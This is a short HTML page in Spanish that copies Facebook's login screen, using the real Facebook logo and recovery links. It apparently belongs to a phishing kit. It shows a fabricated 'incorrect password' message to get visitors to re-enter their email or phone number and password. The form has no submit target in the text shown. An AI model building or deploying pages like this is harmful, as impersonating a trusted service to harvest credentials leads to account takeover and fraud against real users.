<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Facebook - Inicia sesión o regístrate</title>
    <link rel="stylesheet" href="css/Normalize-v8.0.1.css">
    <link rel="stylesheet" href="css/estilosReingreso.css">
</head>
<body>
    <div class="img">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
    </div>
    <div class="contenedorForm">
        <form>
            <h1>Iniciar sesión en Facebook</h1>
            <input autofocus id="text" name="correo" type="text" placeholder="Correo electrónico o número de teléfono" required>
            <input id="pass" name="contraseña" type="password" placeholder="Contraseña" required>
            <p>La contraseña que ingresaste es incorrecta. <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">¿Olvidaste tu contraseña?</a></p>
            <input id="iniciarSesión" type="submit" value="Iniciar sesión">
            <div class="contenedorA">   
                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">¿Olvidaste tu contraeña?</a>
            </div>
        </form>
    </div>
</body>
<footer>
</footer>
</html>
